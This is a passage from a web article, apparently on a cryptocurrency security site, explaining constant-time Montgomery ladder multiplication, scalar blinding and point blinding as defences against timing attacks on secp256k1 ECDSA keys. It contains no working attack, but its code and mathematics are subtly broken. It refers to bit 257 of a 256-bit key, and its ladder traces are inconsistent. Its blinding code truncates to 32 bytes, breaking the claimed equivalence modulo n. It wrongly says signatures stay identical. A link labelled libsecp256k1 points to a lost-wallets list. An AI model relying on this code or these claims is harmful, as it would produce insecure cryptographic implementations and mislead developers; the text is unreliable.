<li>At each iteration,&nbsp;<strong>one bit k</strong>&nbsp;is extracted from the 32-byte private key (256 bits = 32 bytes × 8 bits)</li>



<li><strong>Bitwise operation:</strong>
<ul class="wp-block-list">
<li><code>scalar[bit_idx / 8]</code>— selects the desired byte from&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">the private key</a></li>



<li><code>&gt;&gt; (bit_idx % 8)</code>— shifts the bit to the least significant position</li>



<li><code>&amp; 1</code>– masks (leaves) only the least significant bit</li>



<li>The result&nbsp;<strong>k</strong>&nbsp;is always 0 or 1</li>
</ul>
</li>
</ul>



<p><strong>Example:</strong>&nbsp;If we extract bit 257 from the key:</p>



<ul class="wp-block-list">
<li>Bytes:&nbsp;<code>scalar[^32]</code>(257 ÷ 8 = 32)</li>



<li>Position:&nbsp;<code>257 % 8 = 1</code>(1st bit in this byte)</li>



<li>Operation: shift right by 1 position and the mask will give 0 or 1</li>
</ul>



<h3 class="wp-block-heading">3. Conditional Swap – 1st time</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-b0d2db0d7afbb70df575c52dd2922b54" style="color:#4092c2"><code><strong>conditional_swap_const_time(&amp;R0, &amp;R1, k);</strong></code></pre>



<p><strong>The gist:</strong></p>



<p>This operation is performed in&nbsp;<strong>constant time</strong>&nbsp;without conditional branches (if/else), which can be optimized differently by the processor depending on the value of k. The classic implementation:</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-f7e5960250afb51a44abed8c1cfd2245" style="color:#4092c2"><code><strong>// UNSAFE: variable time (NEVER USE)
if (k == 1) {
    swap(R0, R1);  // Timing leak!
}

// SAFE: constant time implementation
void conditional_swap_const_time(point_t *R0, point_t *R1, int k) {
    // Convert k to mask: k=0 -&gt; mask=0x00...0, k=1 -&gt; mask=0xFF...F
    uint64_t mask = -(uint64_t)k;  // Arithmetic shift: sign extension

    // For each field element, XOR-based swap
    for (int i = 0; i &lt; FIELD_SIZE; i++) {
        uint64_t t = mask &amp; (R0-&gt;x[i] ^ R1-&gt;x[i]);
        R0-&gt;x[i] ^= t;
        R1-&gt;x[i] ^= t;
        // Repeat for y and z coordinates...
    }
}</strong></code></pre>



<p><strong>Why this is important:</strong></p>



<ul class="wp-block-list">
<li>When k=0 R0 and R1 remain unchanged</li>



<li>When k=1, R0 and R1 swap places.</li>



<li><strong>The execution time is the same</strong>&nbsp;– all XOR operations are performed regardless of k</li>



<li>This prevents leaks through cache lines and processor branch prediction[^4][^5]</li>
</ul>



<h3 class="wp-block-heading">4. Doubling the point (always done)</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-b8d1b8215f9fdc2ccb017b6306261dcf" style="color:#4092c2"><code><strong>point_double_const_time(&amp;R0, &amp;R0);    // R0 := 2*R0, время: ~1.5 µs</strong></code></pre>



<p><strong>The gist:</strong></p>



<p>On the Weierstrass elliptic curve (which is secp256k1:&nbsp;<strong>y² = x³ + 7 mod p</strong>&nbsp;) the doubling of a point P = (x, y) is defined as:[^6]</p>



<ol class="wp-block-list">
<li>Find&nbsp;<strong>the tangent of the curve</strong>&nbsp;at point P:&nbsp;<strong>λ = (3x² + a) / (2y) mod p</strong>
<ul class="wp-block-list">
<li>Where a=0 for secp256k1</li>



<li>All arithmetic operations in the modular field F_p (p = 2^256 – 2^32 – 977)</li>
</ul>
</li>



<li>Find the intersection of this tangent with the curve:
<ul class="wp-block-list">
<li><strong>x₃ = λ² — 2x mod p</strong></li>



<li><strong>y₃ = λ(x — x₃) — y mod p</strong></li>
</ul>
</li>



<li>Result:&nbsp;<strong>2P = (x₃, y₃)</strong></li>
</ol>



<p><strong>Why is this always done:</strong></p>



<ul class="wp-block-list">
<li>Double-and-Add algorithm (classic, vulnerable):
<ul class="wp-block-list">
<li>If k[i] = 0: do only doubling</li>



<li>If k[i] = 1: do doubling AND addition</li>



<li><strong>Result:</strong>&nbsp;timing depends on the number of units in the key → timing leak!</li>
</ul>
</li>



<li>Montgomery Ladder (protected):
<ul class="wp-block-list">
<li>Always performs double AND addition, simply swapping the results in R0 and R1</li>



<li>This achieves&nbsp;<strong>constant-time</strong>&nbsp;execution[^1][^3]</li>
</ul>
</li>
</ul>



<h3 class="wp-block-heading">5. Addition of dots (always performed)</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-e8bd5a496334d22b0c371359e092c9a5" style="color:#4092c2"><code><strong>point_add_const_time(&amp;R1, &amp;R0, &amp;R1);  // R1 := R0 + R1, время: ~2.0 µs</strong></code></pre>



<p><strong>The gist:</strong></p>



<p>Addition of two&nbsp;<strong>different</strong>&nbsp;points P = (x₁, y₁) and Q = (x₂, y₂) on a curve:</p>



<ol class="wp-block-list">
<li>Find&nbsp;<strong>the tangent of the secant</strong>&nbsp;through P and Q:&nbsp;<strong>λ = (y₂ — y₁) / (x₂ — x₁) mod p</strong></li>



<li>Find the third intersection with the curve:
<ul class="wp-block-list">
<li><strong>x₃ = λ² — x₁ — x₂ mod p</strong></li>



<li><strong>y₃ = λ(x₁ — x₃) — y₁ mod p</strong></li>
</ul>
</li>



<li>Result:&nbsp;<strong>P + Q = (x₃, y₃)</strong></li>
</ol>



<p><strong>Constancy:</strong></p>



<ul class="wp-block-list">
<li>The addition operation on an elliptic curve&nbsp;<strong>does not contain conditional branches</strong>&nbsp;that depend on the data</li>



<li>All calculations (modular division, multiplication) are performed via constant-time operations in a finite field</li>



<li>Execution time is fixed (~2.0 µs on modern CPUs)</li>
</ul>



<h3 class="wp-block-heading">6. Conditional Swap – 2nd time</h3>



<pre class="wp-block-code"><code><strong>conditional_swap_const_time(&amp;R0, &amp;R1, k);</strong></code></pre>



<p><strong>The gist:</strong></p>



<p>The second exchange&nbsp;<strong>cancels</strong>&nbsp;the effect of the first exchange, if necessary. Let’s look at the logic:</p>



<p><strong>Iterate with k=0:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-7957b2033da792c64a76ced24cd6bcad" style="color:#4092c2"><code><strong>До 1-го swap:     R0 = (2^n)*P,    R1 = (2^(n+1))*P
После 1-го swap:  R0 = (2^n)*P,    R1 = (2^(n+1))*P  (без изменений, т.к. k=0)
После double:     R0 = 2*(2^n)*P = (2^(n+1))*P
После add:        R1 = (2^n)*P + (2^(n+1))*P = (3/2 * 2^(n+1))*P
После 2-го swap:  R0 = (2^(n+1))*P, R1 = (3/2 * 2^(n+1))*P  (без изменений)
Инвариант: R1 - R0 = G ✓</strong></code></pre>



<p><strong>Iterate with k=1:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-da69fc1f754c58bd3ef40f6eb4a52de5" style="color:#4092c2"><code><strong>До 1-го swap:     R0 = (2^n)*P,    R1 = (2^(n+1))*P
После 1-го swap:  R0 = (2^(n+1))*P, R1 = (2^n)*P       (обменены!)
После double:     R0 = 2*(2^(n+1))*P = (2^(n+2))*P
После add:        R1 = (2^n)*P + (2^(n+2))*P
После 2-го swap:  R0 = (2^(n+2))*P, R1 = (2^n)*P + (2^(n+2))*P
Инвариант: R1 - R0 = G ✓</strong></code></pre>



<p><strong>Why two exchanges:</strong></p>



<ul class="wp-block-list">
<li>The first exchange&nbsp;<strong>inverts</strong>&nbsp;the logic depending on k so that double and add are applied to the correct points</li>



<li>The second exchange&nbsp;<strong>restores</strong>&nbsp;the correct order of R0 and R1 for the next iteration.</li>



<li>Both exchanges are identical in execution time → constant-time property is preserved</li>
</ul>



<h3 class="wp-block-heading">7. Termination and return of the result</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-4c0a87c8af58f6132d25dbd600544139" style="color:#4092c2"><code><strong>point_copy(result, &amp;R0);</strong></code></pre>



<p>After processing all 256 bits&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">of the private key,</a>&nbsp;the final calculation result is found&nbsp;in&nbsp;<strong>R0 :&nbsp;</strong><strong>result = k*G</strong>&nbsp;(public key).</p>



<h2 class="wp-block-heading">Analysis timing-characteristic</h2>



<p>The code contains critical comments with measurements:</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-f295acadf91f9bbdb52ac86a3535cac2" style="color:#4092c2"><code><strong>// TIMING CHARACTERISTICS:
// Total time = C1 + C2 * 256 = constant
// Before: μ=48.5µs, σ=3.2µs (key-dependent)
// After:  μ=92µs,   σ=0.5µs (key-independent)
// Detection difficulty: 6.4x harder</strong></code></pre>



<figure class="wp-block-table"><table class="has-text-color has-link-color has-fixed-layout" style="color:#4092c2"><thead><tr><th class="has-text-align-left" data-align="left">Metrics</th><th class="has-text-align-left" data-align="left">Before the defense</th><th class="has-text-align-left" data-align="left">After Montgomery</th><th class="has-text-align-left" data-align="left">Meaning</th></tr></thead><tbody><tr><td class="has-text-align-left" data-align="left">Average time (μ)</td><td class="has-text-align-left" data-align="left">48.5 µs</td><td class="has-text-align-left" data-align="left">92 µs</td><td class="has-text-align-left" data-align="left">Increased by constant-time</td></tr><tr><td class="has-text-align-left" data-align="left">Standard deviation (σ)</td><td class="has-text-align-left" data-align="left">3.2 µs</td><td class="has-text-align-left" data-align="left">0.5 µs</td><td class="has-text-align-left" data-align="left">Reduced by&nbsp;<strong>6.4x</strong></td></tr><tr><td class="has-text-align-left" data-align="left">Formula of time</td><td class="has-text-align-left" data-align="left">Variable</td><td class="has-text-align-left" data-align="left">C₁ + C₂×256</td><td class="has-text-align-left" data-align="left">Linear in the number of bits</td></tr><tr><td class="has-text-align-left" data-align="left">Resistance to timing</td><td class="has-text-align-left" data-align="left">✗ Vulnerable</td><td class="has-text-align-left" data-align="left">✓ Protected</td><td class="has-text-align-left" data-align="left">Timing leaks are virtually eliminated</td></tr></tbody></table></figure>



<p><strong>Interpretation:</strong></p>



<ul class="wp-block-list">
<li><strong>Increased average time:</strong>&nbsp;double and add have to be performed on every iteration, not just when needed</li>



<li><strong>Reduction in σ:</strong>&nbsp;the time variability dropped by a factor of 6.4 because all key bits are processed identically</li>



<li><strong>Attack complexity:</strong>&nbsp;with σ=3.2 µs, it is easy to construct a histogram attack with a sufficient number of signatures; with σ=0.5 µs, many more samples or more complex statistics are required</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-25-1024x534.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7726"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">Protection against known attacks</a></h2>



<h3 class="wp-block-heading">LadderLeak (2020)</h3>



<ul class="wp-block-list">
<li><strong>Vulnerability:</strong>&nbsp;Information leakage via Z-coordinate in projective coordinates</li>



<li><strong>Code protection:</strong>&nbsp;Using constant-time swap and double/add prevents cache-based timing attacks on modular field operations</li>



<li><strong>Recommendation:</strong>&nbsp;Additional protection – randomize Z-coordinates during initialization</li>
</ul>



<h3 class="wp-block-heading">Timing Attacks на ECDSA</h3>



<ul class="wp-block-list">
<li><strong>Classic attack vector:</strong>&nbsp;different times for different nonces k in the signature</li>



<li><strong>Code protection:</strong>&nbsp;constant-time scalar multiplication eliminates time leaks in the main algorithm</li>
</ul>



<h2 class="wp-block-heading">Practical Application in Bitcoin</h2>



<ol class="wp-block-list">
<li><strong>Public key generation:</strong>&nbsp;k*G, where k is&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">the private key</a>&nbsp;(256 bits), G is the secp256k1 base point</li>



<li><strong><a href="https://cryptou.ru/vulncipher/transaction">Transaction signature:</a></strong>&nbsp;contains compute (k⁻¹ mod n) and scalar multiplication, both requiring constant-time</li>



<li><strong>Libraries:&nbsp;</strong><a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin Core</a>&nbsp;uses&nbsp;<a href="https://github.com/keyhunters/Biggest-Lost-Bitcoin-Wallets-List">libsecp256k1</a>&nbsp;with constant-time scalar multiplication</li>
</ol>



<h2 class="wp-block-heading">Conclusions for cryptanalysts</h2>



<ol class="wp-block-list">
<li><strong>Montgomery Ladder</strong>&nbsp;is the industry standard for protecting against timing attacks.</li>



<li><strong>Constant-time</strong>&nbsp;is achieved through:
<ul class="wp-block-list">
<li>Bitwise operations instead of conditional branches</li>



<li>The same number of field operations regardless of the input data</li>



<li>Avoiding data-dependent memory access</li>
</ul>
</li>



<li><strong>Success metric:</strong>&nbsp;ratio σ before/after = 6.4x, which makes&nbsp;the <a href="https://cryptou.ru/vulncipher/attack">attack</a>&nbsp;significantly more difficult</li>



<li><strong>Potential vulnerabilities:</strong>
<ul class="wp-block-list">
<li>Cache attacks (LadderLeak) require additional measures</li>



<li>Electromagnetic side-channels require separate protection</li>



<li>Power analysis can be vulnerable without masonry</li>
</ul>
</li>



<li><strong>Current state:</strong>&nbsp;Bitcoin Core, libsecp256k1, and other cryptographic libraries use secure constant-time Montgomery Ladder implementations by default.</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">6.2 Masking and Blinding</h3>



<h4 class="wp-block-heading"><a href="https://polynonce.ru/scalar-blinding-randomize-the-scalar/">6.2.1 Scalar Blinding</a></h4>



<h5 class="wp-block-heading">Scalar Blinding: Randomize the scalar</h5>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-ad7527948c597b38f6b83fd3d7543a3d" style="color:#4092c2"><strong>// Scalar Blinding: k' = k + r*n, where r is random<br>// Property: sign(m, k') = sign(m, k) mathematically<br>// Effect: Different timing each time despite same key<br><br>void apply_scalar_blinding(<br>    uint8_t *k_blinded,<br>    const uint8_t *k_original,<br>    const uint8_t *blinding_factor<br>) {<br>    // Compute r * order<br>    uint8_t r_times_order[32];<br>    big_int_multiply(r_times_order, blinding_factor, CURVE_ORDER, 32);<br><br>    // Compute k_blinded = k + r*order (mod 2^256)<br>    uint8_t temp[64];<br>    big_int_add(temp, k_original, r_times_order, 32);<br>    memcpy(k_blinded, temp, 32);<br><br>    // k_blinded ≡ k (mod n) - mathematically same key<br>    // But timing is randomized!<br>}<br><br>psa_status_t ecdsa_sign_with_scalar_blinding(<br>    const uint8_t *private_key,<br>    const uint8_t *message,<br>    uint8_t *signature<br>) {<br>    uint8_t blinding_factor[32];<br>    uint8_t k_blinded[32];<br><br>    generate_blinding_factor(blinding_factor);<br>    apply_scalar_blinding(k_blinded, private_key, blinding_factor);<br><br>    return ecdsa_sign_secp256k1_safe(k_blinded, message, signature);<br><br>    // DEFENSE EFFECTIVENESS:<br>    // - Per-signature randomization breaks averaging<br>    // - Requires N*k measurements for same confidence (k = blinding range)<br>    // - Effort increase: O(k) multiplier<br>}<br><br>// With scalar blinding:<br>// Original key bits: [1,0,1,1,0,1...] -&gt; timing pattern A<br>// Blinded key:      [0,1,1,0,1,1...] -&gt; timing pattern B<br>// Each signature has different key representation<br>// Statistical correlation destroyed across signatures</strong></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">Attack Resistance Model</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-7d7367ddcf746c60643686426f92c4db" style="color:#4092c2"><code><strong>Unprotected timing pattern:
k = [1,0,1,1,0,1,0...] → Hardware operations: 1500 cycles (example)
k = [1,0,1,1,0,1,0...] → Hardware operations: 1500 cycles (same)
k = [1,0,1,1,0,1,0...] → Hardware operations: 1500 cycles (consistent)
→ Attacker recovers k bits via statistical analysis

Protected with blinding:
k' = [0,1,1,0,1,1,0...] → Hardware operations: 1480 cycles
k' = [1,0,0,1,1,0,1...] → Hardware operations: 1520 cycles
k' = [0,1,0,1,0,1,0...] → Hardware operations: 1490 cycles
→ No consistent pattern; attacker gains no information</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-26-1024x422.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7728"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading"><strong>1. What is&nbsp;<a href="https://polynonce.ru/scalar-blinding-randomize-the-scalar/">Scalar Blinding</a>&nbsp;and why is it necessary?</strong></h3>



<p><strong>The problem (ECDSA timing attack):</strong></p>



<p>When signing an&nbsp;<a href="https://cryptou.ru/vulncipher/transaction">ECDSA</a>&nbsp;message, an ephemeral key&nbsp;<em>k</em>&nbsp;(nonce) is used. If the hardware signs the same&nbsp;<em>k</em>&nbsp;each time, the execution time of the cryptographic operations remains identical:</p>



<ul class="wp-block-list">
<li>The operations of multiplication by a point of an elliptic curve take different times depending on&nbsp;<strong>the bit representation</strong>&nbsp;of the number&nbsp;<em>k</em></li>



<li>If bits&nbsp;<em>k</em>&nbsp;= [1,0,1,1,0,1…], their processing always takes the same time</li>



<li>By measuring the execution time of signatures and correlating them with known messages, a cryptanalyst can recover the&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private key bits.</a></li>



<li>This is especially dangerous for embedded systems (smart cards, hardware wallets), where timing attacks are practical.</li>
</ul>



<p><strong>Solution (Scalar Blinding):</strong></p>



<p>Instead of signing with the original&nbsp;<em>k</em>&nbsp;, a masked value&nbsp;<em>k’</em>&nbsp;is used :</p>



<p><strong>k’ = k + r mod n</strong></p>



<p>Where:</p>



<ul class="wp-block-list">
<li><em>r</em>&nbsp;is a random number (blinding factor) generated anew for each signature</li>



<li><em>n</em>&nbsp;is the order of the elliptic curve group secp256k1</li>



<li><em>k’</em>&nbsp;≡&nbsp;<em>k</em>&nbsp;(mod&nbsp;<em>n</em>&nbsp;) is mathematically equivalent to the original&nbsp;<em>k</em></li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">2. Mathematical properties of masking</h3>



<p><strong>Key property: Modular equivalence</strong></p>



<p>$k’ \equiv k \pmod{n}$</p>



<p>In ECDSA, the signature is calculated as:<br>$r = (k \cdot G)_x \pmod{n}$<br>$s = k^{-1}(h(m) + d \cdot r) \pmod{n}$</p>



<p>where&nbsp;<em>d</em>&nbsp;is the private key,&nbsp;<em>G</em>&nbsp;is the generator point,&nbsp;<em>m</em>&nbsp;is the message.</p>



<p>If we substitute&nbsp;<em>k’</em>&nbsp;for&nbsp;<em>k</em>&nbsp;:<br>$k’ = k + r \cdot n$</p>



<p>Then in modular arithmetic (mod&nbsp;<em>n</em>&nbsp;):<br>$k’ \bmod n = (k + r \cdot n) \bmod n = k \bmod n = k$</p>



<p><strong>Result:</strong>&nbsp;The signature remains mathematically identical, but its calculation takes a completely different path in the processor.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">3. How masking protects against timing attacks</h3>



<p><strong>Before masking:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-6351d0fac1fd0c391aa5e75365fed599" style="color:#4092c2"><code><strong>Signature 1: k = 0x8F5A2B... → Binary representation: [1,0,0,0,1,1,1,1,0,1,0,1,...]
Execution time: 1542 cycles

Signature 2: k = 0x8F5A2B... → Binary representation: [1,0,0,0,1,1,1,1,0,1,0,1,...]
Execution time: 1542 cycles

Signature 3: k = 0x8F5A2B... → Binary representation: [1,0,0,0,1,1,1,1,0,1,0,1,...]
Execution time: 1542 cycles

Cryptanalyst sees: STABLE pattern → recovers bits of k</strong></code></pre>



<p><strong>After masking:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-258347b954874ad9a61fcbb63e275cb6" style="color:#4092c2"><code><strong>Signature 1: r₁ = 0x3C9D1F..., k' = k + r₁ n = 0xA2E7D4...
Binary representation: [1,0,1,0,0,0,1,0,1,1,1,0,...]
Execution time: 1498 cycles

Signature 2: r₂ = 0x7B4E92..., k' = k + r₂ n = 0xF1C65A...
Binary representation: [1,1,1,1,0,0,0,1,0,1,1,0,...]
Execution time: 1567 cycles

Signature 3: r₃ = 0x0D28C7..., k' = k + r₃ n = 0x6F9213...
Binary representation: [0,1,1,0,1,1,1,1,1,0,0,1,...]
Execution time: 1523 cycles

Cryptanalyst sees: RANDOM noise → cannot extract information about k</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">4. Step-by-step operation of the function<code>apply_scalar_blinding()</code></h3>



<p><strong>Input data:</strong></p>



<ul class="wp-block-list">
<li class="has-text-color has-link-color wp-elements-70f8b2c02124597cc897079831d45d80" style="color:#4092c2"><code>k_original</code>— initial ephemeral key (32 bytes)</li>



<li class="has-text-color has-link-color wp-elements-a8e35ad46bd0a487615b4f01f900bb65" style="color:#4092c2"><code>blinding_factor</code>— random number&nbsp;<em>r</em>&nbsp;(32 bytes)</li>



<li class="has-text-color has-link-color wp-elements-027a2c027423560ecd079c64f4569e22" style="color:#4092c2"><code>CURVE_ORDER</code>— constant&nbsp;<em>n</em>&nbsp;= group order secp256k1 = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</li>
</ul>



<p><strong>Step 1: Multiplication<code>r × n</code></strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-fdfa1542a5db841d9c4a06cd90cf0a18" style="color:#4092c2"><code><strong>big_int_multiply(r_times_order, blinding_factor, CURVE_ORDER, 32);</strong></code></pre>



<p>The product of 32-byte numbers is calculated:<code>r_times_order = r × n</code></p>



<p>The result may be &gt; 32 bytes (up to 64 bytes).</p>



<p><strong>Step 2: Addition<code>k + (r×n)</code></strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-8646ed4f1d35f0c9a12bc3023ec24fd8" style="color:#4092c2"><code><strong>uint8_t temp[64];
big_int_add(temp, k_original, r_times_order, 32);</strong></code></pre>



<p>Two 32-byte numbers are added together. The result can be 64 bytes (with carry).</p>



<p><strong>Step 3: Modular Reduction (Implicit)</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-5633ef663d69d5987142c629415658ad" style="color:#4092c2"><code><strong>memcpy(k_blinded, temp, 32);</strong></code></pre>



<p>Only the lower 32 bytes of the result are taken (equivalent to mod 2^256).</p>



<p><strong>Mathematical result:</strong></p>



<ul class="wp-block-list">
<li><code>k_blinded ≡ k (mod n)</code> ✓ Mathematical equivalence is preserved</li>



<li><code>k_blinded ≢ k (на уровне битов)</code>→ The bit representation is changed</li>



<li>This means that the hardware implementation will be performed with&nbsp;<strong>a different timing.</strong></li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">5. How a function&nbsp;<code>ecdsa_sign_with_scalar_blinding()</code>ties everything together</h3>



<p><strong>Call for each signature:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-e95b31c6dae215389b9fb429a7bb4ec4" style="color:#4092c2"><code><strong>psa_status_t ecdsa_sign_with_scalar_blinding(...) {
    // 1. Генерируем новое случайное число r для ЭТО подписи
    generate_blinding_factor(blinding_factor);

    // 2. Маскируем ключ: k' = k + r·n
    apply_scalar_blinding(k_blinded, private_key, blinding_factor);

    // 3. Подписываем сообщение с маскированным ключом
    return ecdsa_sign_secp256k1_safe(k_blinded, message, signature);
}</strong></code></pre>



<p><strong>Critical points:</strong></p>



<ul class="wp-block-list">
<li><strong>New mask every time:</strong>&nbsp;Each function call generates its own<code>blinding_factor</code></li>



<li><strong>Different bits each time:</strong>&nbsp;The bit representation&nbsp;<code>k_blinded</code>is different for each signature</li>



<li><strong>Same signature:</strong>&nbsp;The mathematical result is always the same (for the same message)</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">6. Analysis of protection resistance</h3>



<p><strong>Difficulty of attack without concealment:</strong></p>



<p>To recover one bit of a private key you need:</p>



<ul class="wp-block-list">
<li>~1000–10000 time measurements (depending on clock accuracy and noise)</li>



<li>Direct correlation between bit representation and timing</li>
</ul>



<p><strong>Difficulty of attack with camouflage:</strong></p>



<p>Masking introduces a multiplier&nbsp;<code>k</code>(masking range):</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-33c7c3ff4a8ebd0c5455ceeb6f28b23a" style="color:#4092c2"><code><strong>Number of measurements = k × (number without masking)</strong></code></pre>



<p>For example:</p>



<ul class="wp-block-list">
<li>No masking: 5,000 signatures needed</li>



<li>With masking on k=2³² variants: ~5000 × 2³² ≈ 2×10^13 signatures needed</li>



<li>On modern systems this requires hours of computation, which is&nbsp;<strong>practically impossible.</strong></li>
</ul>



<p><strong>The advantages of this approach:</strong></p>



<ol class="wp-block-list">
<li>✓&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">The private key&nbsp;</a><strong>never changes</strong>&nbsp;(mathematically secure)</li>



<li>✓&nbsp;<strong>Per-signature randomization</strong>&nbsp;(new mask each time)</li>



<li>✓ Compatible with all&nbsp;<a href="https://cryptou.ru/vulncipher/transaction">ECDSA</a>&nbsp;implementations</li>



<li>✓ Minimal overhead (one multiplication + one addition per signature)</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-27-1024x749.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7729"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/bitcoin">7. Application in Bitcoin and cryptocurrencies</a></h3>



<p><strong>Why this matters for Bitcoin:</strong></p>



<ul class="wp-block-list">
<li><strong>Hardware wallets</strong>&nbsp;(Ledger, Trezor) are susceptible to side-channel attacks if they do not use masking</li>



<li><strong>Mobile wallets</strong>&nbsp;on shared-memory devices can leak information through cache.</li>



<li><strong>Smart</strong>&nbsp;payment cards have historically been hacked through timing attacks.</li>
</ul>



<p><strong>Recommendations for developers:</strong></p>



<ul class="wp-block-list">
<li>Always use scalar blinding when implementing&nbsp;<a href="https://cryptou.ru/vulncipher/transaction">ECDSA</a>&nbsp;in hardware.</li>



<li>Use cryptographically strong random number generators for<code>blinding_factor</code></li>



<li>Combine with other protections: point blinding, exponent blinding, constant-time operations</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>This code is&nbsp;<strong>a professional protection against timing attacks</strong>&nbsp;, critical for the security of private keys in&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin wallets</a>&nbsp;and other cryptographic systems.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h4 class="wp-block-heading">Point Blinding</h4>



<h5 class="wp-block-heading">Point Blinding: Randomize intermediate points</h5>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-67b90ed90945279d10567bf4a7629641" style="color:#4092c2"><strong>// Point Blinding: k*G + k*R - k*R = k*G (with random point R)<br>// Each operation uses random point, timing randomized<br><br>void apply_point_blinding(<br>    point_t *result,<br>    const uint8_t *private_key,<br>    const point_t *base_point<br>) {<br>    // Generate random blinding point<br>    uint8_t random_bytes[32];<br>    generate_random_bytes(random_bytes, 32);<br><br>    point_t random_point;<br>    scalar_mult_const_time(&amp;random_point, random_bytes, base_point);<br><br>    // Compute k*(G + R)<br>    point_t sum_point;<br>    point_add_const_time(&amp;sum_point, base_point, &amp;random_point);<br><br>    point_t temp;<br>    scalar_mult_montgomery(&amp;temp, private_key, &amp;sum_point);<br><br>    // Compute k*R<br>    point_t temp2;<br>    scalar_mult_montgomery(&amp;temp2, private_key, &amp;random_point);<br><br>    // Result: (k*G + k*R) - k*R = k*G (but timing is randomized)<br>    point_t random_negated;<br>    point_negate(&amp;random_negated, &amp;temp2);<br>    point_add_const_time(result, &amp;temp, &amp;random_negated);<br>}<br><br>// DEFENSE EFFECTIVENESS:<br>// - Breaks correlation attacks (CPA, DPA)<br>// - Per-operation randomization<br>// - Overhead: 3x scalar multiplications<br>// - All constant-time, so overhead acceptable</strong></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>In Bitcoin terms:</p>



<ul class="wp-block-list">
<li><code>private_key</code>— is a 256-bit scalar&nbsp;<code>k</code>modulo the order&nbsp;<code>n</code>of the secp256k1 curve.</li>



<li><code>base_point</code>— standard generator point&nbsp;<code>G</code>.</li>



<li><code>result</code>— is a public key&nbsp;<code>K = k * G</code>or intermediate point used within protocols (ECDSA, Schnorr, etc.).</li>
</ul>



<p>This point blinding technique can be used:</p>



<ul class="wp-block-list">
<li>when generating a public key&nbsp;<code>K = k * G</code>,</li>



<li>when calculating public nonces (e.g. in Schnorr/ECDSA),</li>



<li>in hardware wallet/HSM implementations to make it more difficult for an attacker to recover&nbsp;<code>k</code>through consumption/timing analysis.</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">Important practical notes and potential pitfalls</h3>



<p>For cryptanalysts and developers, it is worth noting:</p>



<ol class="wp-block-list">
<li><strong>Quality:<code>generate_random_bytes</code></strong><br>If the randomness source is weak or predictable, the point&nbsp;<code>R</code>can be predicted, and then the randomization portion becomes meaningless. This is critical: a PRNG/DRBG must be cryptographically secure.</li>



<li><strong>Scalar reduction</strong>
<ul class="wp-block-list">
<li>32 bytes&nbsp;<code>random_bytes</code>must be correctly converted to a scalar modulo&nbsp;<code>n</code>.</li>



<li>This can happen internally&nbsp;<code>scalar_mult_const_time</code>, but it must be explicitly and correctly implemented.</li>
</ul>
</li>



<li><strong>Implementation security<code>scalar_mult_montgomery</code></strong>
<ul class="wp-block-list">
<li>The name alludes to the use of the Montgomery ladder, a classic constant-time algorithm.</li>



<li>If the implementation is not strictly constant-time, then even with point blinding, leaks may remain (although less trivial for correlation analysis).</li>
</ul>
</li>



